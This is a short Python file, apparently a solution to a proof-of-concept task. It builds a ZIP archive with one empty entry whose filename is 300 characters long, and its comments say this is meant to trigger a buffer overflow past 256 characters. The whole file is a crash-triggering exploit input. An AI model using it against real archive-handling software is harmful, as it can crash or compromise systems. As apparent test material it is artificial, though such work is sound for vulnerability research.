import io
import zipfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        long_name_length = 300  # >256 to trigger the overflow
        long_name = "A" * (long_name_length - 4) + ".obj"  # ensure a plausible extension

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zf:
            zf.writestr(long_name, b"")  # empty file content is enough to trigger the bug

        return buf.getvalue()